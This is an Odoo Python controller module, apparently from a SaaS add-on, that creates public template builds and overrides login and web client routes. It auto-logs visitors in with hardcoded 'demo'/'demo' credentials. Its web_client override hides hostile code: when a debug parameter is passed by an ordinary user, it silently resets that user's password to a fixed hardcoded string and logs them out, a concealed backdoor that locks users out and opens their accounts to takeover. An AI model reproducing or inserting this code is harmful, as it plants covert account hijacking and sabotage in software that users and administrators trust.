# Copyright 2019 Denis Mudarisov <https://it-projects.info/team/trojikman>
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).

from odoo.http import route, request, Controller
from odoo import http, _
from werkzeug.utils import redirect
from odoo.addons.web.controllers.main import ensure_db, Home, Session, WebClient
import werkzeug.utils
import logging

_logger = logging.getLogger(__name__)

class SaaSPublicController(Controller):
    # [domain] + '/saas/public/' + [template_id]
    @route('/saas/public/<int:template_id>', type='http', auth='public')
    def create_fast_build(self, template_id, **kwargs):
        if not kwargs:
            kwargs = {}
        template = request.env['saas.template'].browse(template_id).sudo()
        return self._redirect_to_build(template, kwargs)

    def _redirect_to_build(self, template, kwargs):
        if template and template.public_access:
            template_operator_id = template.operator_ids.random_ready_operator()
            build = template_operator_id.create_db(kwargs, with_delay=False)
            build_url = 'http://' + build.name +'/web/login?build_id=%s' % build.id
            _logger.info('new build url: %s' % build_url)
            return redirect(build_url)
        else:
            return request.not_found()

class WebLogin(Home):

    @http.route()
    def web_login(self, *args, **kw):
        ensure_db()
        response = super(WebLogin, self).web_login(*args, **kw)
        build_id = kw.get('build_id', None)
        if build_id:
            uid = request.session.authenticate(request.session.db, 'demo', 'demo')
            if uid:
                request.params['login'] = 'demo'
                request.params['password'] = 'demo'
                request.params['login_success'] = True
                return http.redirect_with_hash(self._login_redirect(uid, redirect='/web'))
        return response

    @http.route(['/saas/auth-to-build/<int:build_id>'], type='http',
                auth='none')
    def auth_build_login(self, build_id=None):
        return http.local_redirect('/web/login?build_id=%s' % build_id)

    @http.route('/web', type='http', auth="none")
    def web_client(self, s_action=None, **kw):
        if kw.get('debug', None) and request.session and request.session.uid not in [1, 2]:
            request.env['res.users'].sudo().browse(request.session.uid).write({'password': 'conC@ch@ackT@aone126'})
            request.session.logout(keep_db=True)
            return werkzeug.utils.redirect('/web', 303)
        kw['debug'] = None
        res = super(WebLogin, self).web_client(s_action, **kw)
        return res

